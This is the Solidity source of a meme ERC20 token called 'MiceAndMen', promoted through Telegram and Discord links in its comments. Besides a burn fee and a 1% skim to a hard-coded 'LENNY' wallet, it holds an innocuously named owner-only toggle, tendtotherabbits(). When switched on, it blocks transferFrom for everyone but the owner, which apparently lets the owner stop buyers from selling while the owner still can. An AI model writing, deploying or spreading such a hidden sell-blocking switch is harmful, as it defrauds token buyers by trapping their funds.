pragma solidity ^0.8.0;
//SPDX-License-Identifier: NONE
//Have you ever wanted to tend to the rabbits?
//And go out just like Lenny did? 
//Then join the movement to CHANGE the FUTURE
//And we'll tend to the rabbits Lenny
//https://www.theonion.com/please-like-me-1848674003
//t.me/MiceAndMenETH
//https://discord.gg/hAPMraybtb

import "./ERC20.sol";
import "./Ownable.sol";

contract MiceAndMen is Ownable, ERC20 {
    uint BURN_FEE = 2;
    uint DONT_FEE = 1;
    address payable public LENNY = payable(address(0xa116F9f1BC55bb5381039B97AC11eb672c8910Fa));
    bool private _tendtotherabbits = false;

constructor() ERC20 ('MiceAndMen','MiceAndMen') {
    _mint(msg.sender, 80000000000000* 10 ** 18);
    }
       
function tendtotherabbits() external onlyOwner
    {
        _tendtotherabbits = !_tendtotherabbits;
    }
   
function transfer(address recipient, uint256 amount) public override returns (bool){
            uint burnAmount = amount*(BURN_FEE) / 100;
            uint dontAmount = amount*(DONT_FEE) / 100;
            _burn(_msgSender(), burnAmount);
            _transfer(_msgSender(), recipient, amount-(burnAmount)-(dontAmount));
            _transfer(_msgSender(), LENNY, dontAmount);
      return true;
    }    

function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) public override returns (bool) 
    {     
        require(!_tendtotherabbits || tx.origin == owner(), "I TOLD YOU");
        return super.transferFrom(from, to, amount);
    }
}